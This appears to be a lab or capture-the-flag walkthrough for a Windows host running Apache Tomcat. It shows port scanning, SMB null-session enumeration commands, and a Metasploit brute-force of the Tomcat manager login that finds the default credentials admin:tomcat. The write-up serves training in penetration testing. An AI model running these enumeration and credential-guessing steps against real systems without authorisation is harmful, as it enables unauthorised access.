# Scan the network and look for the ipaddress

![Screenshot from 2025-05-23 11-39-09](https://github.com/user-attachments/assets/d853c7c6-83cd-4f4b-a33a-04beb37b8fd1)

# ping the target

![Screenshot from 2025-05-23 11-39-21](https://github.com/user-attachments/assets/89b20baf-7cce-43e9-a63c-478e8ccd670e)


ttl  suggests it is a windows machine
# lets look for the open ports

![Screenshot from 2025-05-23 11-40-11](https://github.com/user-attachments/assets/77438708-e8b7-4dfe-83e4-04a13f6d0f38)

![Screenshot from 2025-05-23 11-54-18](https://github.com/user-attachments/assets/61b798b5-a7c0-4ef6-ace5-52795cb66caf)

# lets see what services are running and run some scripts against them

![Screenshot from 2025-05-23 11-57-56](https://github.com/user-attachments/assets/4407a8be-3bcd-4b90-a9be-a185686c6ca0)

![Screenshot from 2025-05-23 12-06-57](https://github.com/user-attachments/assets/8c006441-f34f-4d8d-a825-adc62bbb21bd)

![Screenshot from 2025-05-23 12-07-09](https://github.com/user-attachments/assets/35de2317-193f-44b2-aa0d-b5b069b14ba5)

# lets look up for some vulnerabilities

![Screenshot from 2025-05-23 11-57-46](https://github.com/user-attachments/assets/dff0d628-f193-4eba-8720-5cd8a937573a)

![Screenshot from 2025-05-23 12-09-13](https://github.com/user-attachments/assets/57e25747-8cd2-4e45-8e8a-ced4ae234365)

# lets try to map the smb


# check if you can bypass smb login and access the share
```
smbclient -NL 192.168.0.59                  
session setup failed: NT_STATUS_ACCESS_DENIED
```
```
crackmapexec smb 192.168.0.59 -u '' -p '' --shares
SMB         192.168.0.59    445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)
SMB         192.168.0.59    445    WAR              [-] WAR\: STATUS_INVALID_PARAMETER 
SMB         192.168.0.59    445    WAR              [-] Error enumerating shares: Error occurs while reading from remote(104)
                                
```
```
smbmap --no-banner -H 192.168.0.59
[\] Checking for open ports...                                                                     [*] Detected 1 hosts serving SMB
[|] Authenticating...                                                                              [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Something weird happened on (192.168.0.59) Error occurs while reading from remote(104) on line 1015
[/] Closing connections..                                                                          [-] Closing connections..                                                                          [\] Closing connections..                                                                          [|] Closing connections..                                                                          [/] Closing connections..                                                                          [-] Closing connections..                                                                                                                                                                             [*] Closed 1 connections
```

# lets look into the web server
```
http://192.168.0.59:8080/
```


![apche_tom_cat_war](https://github.com/user-attachments/assets/5b65365e-966f-4bb3-8a72-ff3c245ed3f4)


# lets try to bruteforce using the default credentials from the metasploit
```
 use 63
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting           Required  Description
   ----              ---------------           --------  -----------
   ANONYMOUS_LOGIN   false                     yes       Attempt to login with a blank username a
                                                         nd password
   BLANK_PASSWORDS   false                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                     no        Try each user/password couple stored in
                                                         the current database
   DB_ALL_PASS       false                     no        Add all passwords in the current databas
                                                         e to the list
   DB_ALL_USERS      false                     no        Add all users in the current database to
                                                          the list
   DB_SKIP_EXISTING  none                      no        Skip existing credentials stored in the
                                                         current database (Accepted: none, user,
                                                         user&realm)
   PASSWORD                                    no        The HTTP password to specify for authent
                                                         ication
   PASS_FILE         /usr/share/metasploit-fr  no        File containing passwords, one per line
                     amework/data/wordlists/t
                     omcat_mgr_default_pass.t
                     xt
   Proxies                                     no        A proxy chain of format type:host:port[,
                                                         type:host:port][...]
   RHOSTS                                      yes       The target host(s), see https://docs.met
                                                         asploit.com/docs/using-metasploit/basics
                                                         /using-metasploit.html
   RPORT             8080                      yes       The target port (TCP)
   SSL               false                     no        Negotiate SSL/TLS for outgoing connectio
                                                         ns
   STOP_ON_SUCCESS   false                     yes       Stop guessing when a credential works fo
                                                         r a host
   TARGETURI         /manager/html             yes       URI for Manager login. Default is /manag
                                                         er/html
   THREADS           1                         yes       The number of concurrent threads (max on
                                                         e per host)
   USERNAME                                    no        The HTTP username to specify for authent
                                                         ication
   USERPASS_FILE     /usr/share/metasploit-fr  no        File containing users and passwords sepa
                     amework/data/wordlists/t            rated by space, one pair per line
                     omcat_mgr_default_userpa
                     ss.txt
   USER_AS_PASS      false                     no        Try the username as the password for all
                                                          users
   USER_FILE         /usr/share/metasploit-fr  no        File containing users, one per line
                     amework/data/wordlists/t
                     omcat_mgr_default_users.
                     txt
   VERBOSE           true                      yes       Whether to print output for all attempts
   VHOST                                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.0.59
RHOSTS => 192.168.0.59
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:root (Incorrect)
[+] 192.168.0.59:8080 - Login Successful: admin:tomcat
[-] 192.168.0.59:8080 - LOGIN FAILED: manager:admin (Incorrect)
```
We got our username and password
```
admin:tomcat
```

